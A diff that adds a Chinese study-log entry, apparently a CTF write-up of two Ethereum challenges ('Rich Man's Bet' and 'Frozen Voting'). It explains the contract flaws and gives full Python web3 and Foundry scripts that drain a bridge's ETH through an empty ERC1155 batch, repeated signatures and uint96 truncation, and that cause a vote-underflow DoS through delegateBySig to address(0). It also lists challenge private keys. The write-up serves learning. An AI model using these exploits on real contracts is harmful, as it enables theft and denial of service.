@@ -15,6 +15,274 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-06
+
+欸，RemedyCTF还有一个最简单的题目Rich Man's Bet，下面是Writeup（附件也不给了）
+
+这题相比前面的Diamond Heist，合约数量大幅降低，但是作为一个治理合约这题难度也不低（虽然也是并列第3高解出的题目）
+
+那么还是老样子，先分析一下合约内容：
+
+- AdminNFT.sol是一个基础的ERC1155合约，这种合约支持多个代币的存储和批量转发
+- Challenge.sol里面包含了我们的最终目标：完成“挑战”并且将跨链桥合约的余额全部转走（虽然这题并没有也不需要跨链），至于挑战就是非常简单的3个数学题，随便代进去几个数就做出来了
+- 核心合约Bridge.sol是一个ERC1155Receiver合约，说明这个合约支持ERC1155的多代币批量转发操作，同时我们也能看到有个`onERC1155Received`，即接收到ERC1155转入的代币会自动调用该函数，同理还有个`onERC1155BatchReceived`会在接收到批量转发的代币的时候被调用 当然作为治理合约，肯定有治理逻辑，这里就是通过NFT的Power进行治理的：Admin持有的NFT的Power是10000 ether，而一般的NFT只有50 ether，而更改跨链桥设置需要所有签名人的Power大于总数的一半且都为Validator，而最终的`withdrawEth`则需要所有支持提款的总人数超过阈值（Challenge.sol设定为10）且都在初始设定的`withdrawValidator`名单中，但是很明显除了合约自己我们谁都不在名单里面...
+
+好的，现在让我们开始做题，首先我们可以很快得到三道数学题的一组合法解，解出来后在Bridge中验证挑战即可完成`isSolved`的前面2个要求：
+
+```Python
+def main():
+    # 1. Solve the 3 stages
+    # Q1: 6  Q2: 59,101  Q3: 1 0 2
+    print("\nSolving stages...")
+    send_transaction(challenge.functions.solveStage1(6), account)
+    print("\nStage 1 completed")
+    send_transaction(challenge.functions.solveStage2(59, 101), account)
+    print("\nStage 2 completed")
+    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
+    print("\nStage 3 completed")
+
+    # 2. Verify challenge
+    send_transaction(bridge.functions.verifyChallenge(), account)
+    if challenge.functions.challengeSolved().call():
+        print("\nChallenge verified")
+    else:
+        print("\nChallenge failed")
+```
+
+接下来我们进行提款，上面提到了没有人能够提款，因此我们只能尝试让threshold变为0，而唯二能更改threshold的值的地方只有constructor和`changeBridgeSettings`两个地方，也就是说我们就是得更新设置，那么我们有需要成为Validator，而能成为Validator的地方就只有两个`onERC1155(Batch)Received`了，也就是说我们就是得向Bridge转入代币...吗？
+
+仔细查看ERC1155的实现，我们发现如果id和amount两个数组为空数组（即转入0种代币）也是会正常调用目标ERC1155Receiver的`onERC1155BatchReceived`函数的，而Bridge中并没有检测转入的代币种类是否为0，所以我们只需要转入0种代币即可：
+
+```Python
+make_validator = lambda acc: send_transaction(
+    admin_nft.functions.safeBatchTransferFrom(
+        acc.address, bridge.address, [], [], w3.to_bytes(text="")
+    ),
+    acc,
+    gas=150000,
+)
+```
+
+然后进入到`changeBridgeSettings`的部分，我们发现验证签名是否有效的时候只会记录`lastSigner`并和其比对，那么我们只需要有至少2个签名就能进行无限的验证，从而达到刷Power的目的，因此我们只需要再新创建一个地址并让它签一下名就行了，当然前置是需要这个地址也成为Validator；修改的设置中我们只需要修改threshold，但是这个新的threshold必须大于1...看起来没有办法，但是仔细看一下函数传入的数据类型：是一个uint256，而最后使用的threshold是一个uint96，中间进行了一次显式类型转换，也就是说如果我们传入的数很大，类型转换会产生数据丢失，比如我们传入的newThreshold是$$2^{96}$$，那么最后我们会有threshold = uint96(newThreshold) = 0
+
+所以我们根据上面的理论更新完设置后直接withdrawEth就行了，签名列表为空就行，最后的脚本如下：（有些多余的ABI可以删掉，因为没有调用到）
+
+```Python
+# 3f716403f4394aa3c38997b1aeebed19
+# [rich-mans-bet] RPC Endpoints:
+# [rich-mans-bet]     - http://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main
+# [rich-mans-bet]     - ws://46.101.119.98:8545/oeYWbzukdrAnjozjEiXuGxtH/main/ws
+#
+# [rich-mans-bet] The Player private key:         0x2f24a9c9f818b1315f24eb909f85cefb6ea66bc31fc77744778acc400d6d3ba0
+# [rich-mans-bet] The Challenge contract address: 0x3346B289790b9328b4661193DaEADDcD6a4a5B3a
+
+from web3 import Web3
+from eth_account import Account
+from eth_account.messages import encode_typed_data, encode_defunct
+import eth_abi
+import time
+
+RPC_URL = "http://46.101.119.98:8545/emjhmdIoWPlMCHBRzbGAHdBe/main"
+w3 = Web3(Web3.HTTPProvider(RPC_URL))
+
+PRIVATE_KEY = "0xc9607d2731ff52283f710a04251fa72f9819b072cd2c44e3f5367c9ee6dbf731"
+CHALLENGE_ADDRESS = "0x553c30968D4233048Bd9E2153D442ab24511960B"
+account = Account.from_key(PRIVATE_KEY)
+
+def send_transaction(contract_function, account, nonce_offset=0, value=0, gas=500000):
+    """Helper function to send transactions"""
+    transaction = contract_function.build_transaction(
+        {
+            "from": account.address,
+            "nonce": w3.eth.get_transaction_count(account.address) + nonce_offset,
+            "gas": gas,
+            "maxFeePerGas": w3.eth.gas_price * 2,
+            "maxPriorityFeePerGas": w3.eth.gas_price,
+            "value": w3.to_wei(value, "ether"),
+        }
+    )
+    return send_signed(transaction, account)
+
+def send_signed(transaction, account):
+    signed_txn = w3.eth.account.sign_transaction(transaction, account.key.hex())
+    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    return receipt
+
+def init():
+    global challenge, bridge, admin_nft
+    challenge = w3.eth.contract(
+        address=CHALLENGE_ADDRESS,
+        abi=[
+            # 此处省略abi
+        ],
+    )
+
+    bridge = w3.eth.contract(
+        address=challenge.functions.BRIDGE().call(),
+        abi=[
+            # 此处省略abi
+        ],
+    )
+
+    admin_nft = w3.eth.contract(
+        address=challenge.functions.ADMIN_NFT().call(),
+        abi=[
+            # 此处省略abi
+        ],
+    )
+
+def main():
+    # 1. Solve the 3 stages
+    # Q1: 6  Q2: 59,101  Q3: 1 0 2
+    print("\nSolving stages...")
+    send_transaction(challenge.functions.solveStage1(6), account)
+    print("\nStage 1 completed")
+    send_transaction(challenge.functions.solveStage2(59, 101), account)
+    print("\nStage 2 completed")
+    send_transaction(challenge.functions.solveStage3(1, 0, 2), account)
+    print("\nStage 3 completed")
+
+    # 2. Verify challenge
+    send_transaction(bridge.functions.verifyChallenge(), account)
+    if challenge.functions.challengeSolved().call():
+        print("\nChallenge verified")
+    else:
+        print("\nChallenge failed")
+
+init()
+main()
+# print(bridge.functions.threshold().call())
+# exit(0)
+
+print(w3.from_wei(w3.eth.get_balance(account.address), "ether"))
+make_validator = lambda acc: send_transaction(
+    admin_nft.functions.safeBatchTransferFrom(
+        acc.address, bridge.address, [], [], w3.to_bytes(text="")
+    ),
+    acc,
+    gas=150000,
+)
+new_acc = w3.eth.account.create()
+print(
+    send_signed(
+        {
+            "to": new_acc.address,
+            "value": w3.to_wei("0.03", "ether"),
+            "gas": 21000,
+            "gasPrice": w3.to_wei("50", "gwei"),
+            "chainId": w3.eth.chain_id,  # Mainnet: 1, Goerli: 5, etc.
+            "nonce": w3.eth.get_transaction_count(account.address),
+        },
+        account,
+    )
+)
+print(make_validator(account))
+print(make_validator(new_acc))
+
+message = eth_abi.encode(
+    ["address", "address", "uint256"], [challenge.address, admin_nft.address, 2**96]
+)
+signed_message_a = w3.eth.account.sign_message(
+    encode_defunct(message), private_key=PRIVATE_KEY
+)
+signed_message_b = w3.eth.account.sign_message(
+    encode_defunct(message), private_key=new_acc.key
+)
+
+message_hash = message  # From step 1
+receiver = account.address  # Replace with the actual receiver address
+amount = 1000000000000000000  # Example amount in wei (1 ETH)
+callback = Web3.to_bytes(text="example_callback_data")  # Example callback data
+
+# Prepare the arguments
+signatures = [
+    signed_message_a.signature,
+    signed_message_b.signature,
+] * 70
+print(
+    send_transaction(
+        bridge.functions.changeBridgeSettings(message_hash, signatures),
+        account,
+        gas=3000000,
+    )
+)
+
+print(
+    send_transaction(
+        bridge.functions.withdrawEth(
+            Web3.to_bytes(b"nyaaaaa".ljust(32)),
+            [],
+            account.address,
+            w3.to_wei(1000, "ether"),
+            callback,
+        ),
+        account,
+    )
+)
+```
+
+------
+
+老传统，再接一题吧，同个比赛的题目Frozen Voting：
+
+根据提供的题目合约，我们可以知道ADMIN在mint了一个10000票权的NFT后delegate给了我们自己，同时我们自己有一个1票权的NFT，此时我们的票权为10001；而最后的`isSolved`会尝试更换delegate并转移走10000票权的NFT，而我们的目标就是阻止这次操作
+
+那么其实很明显了：我们唯一能做的就是在第一步更换delegate的时候做手脚，而NFT在发生所有权变更的时候一定会调用`_delegate`，而其中的`_moveDelegates`会减去上一任delegatee的票权并加到下一位那里，因此很简单：我们要想办法通过`_delegate`让自己的票权小于10000，从而触发整型下溢以实现DoS攻击
+
+经过一点简单的代码审计，我们发现`delegateBySig`函数有点小小的问题：相比`delegate`函数，它缺少了对`delegatee`参数是否为`address(0)`的确认与操作，从而使得我们可以将自己的NFT通过`delegateBySig`函数delegate给0x0地址，而根据`_moveDelegates`函数，此时我们的票权会-1，而没有人的票权会上升（合约误以为我们销毁了NFT），因此此时我们再一次进行`delegateBySig`或者直接`transferFrom`给任意的地址即可让我们的票权达到9999，进而实现前面的目的
+
+下面是forge的解题script：
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-ctf/CTFSolver.sol";
+
+import "src/Challenge.sol";
+
+contract Solve is CTFSolver {
+    function solve(address challenge, address player) internal override {
+        uint256 playerPrivateKey = vm.envOr(
+            "PLAYER",
+            uint256(
+                0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
+            )
+        );
+        Challenge ch = Challenge(challenge);
+        VotingERC721 votingToken = ch.votingToken();
+
+        address delegatee = address(0x0);
+        uint256 nonce = votingToken.nonces(player);
+        uint256 expiry = block.timestamp + 1 days;
+        bytes32 DOMAIN_TYPEHASH = votingToken.DOMAIN_TYPEHASH();
+        bytes32 DELEGATION_TYPEHASH = votingToken.DELEGATION_TYPEHASH();
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                DOMAIN_TYPEHASH,
+                keccak256("VotingERC721"),
+                block.chainid,
+                address(votingToken)
+            )
+        );
+        bytes32 structHash = keccak256(
+            abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)
+        );
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", domainSeparator, structHash)
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+        votingToken.delegateBySig(delegatee, nonce, expiry, v, r, s);
+
+        address account2 = address(0x1);
+        votingToken.transferFrom(player, account2, 123);
+
+        ch.isSolved();
+    }
+}
+```
+
 # 2025-08-05
 
 凌晨学完，白天就不用学了（确信）
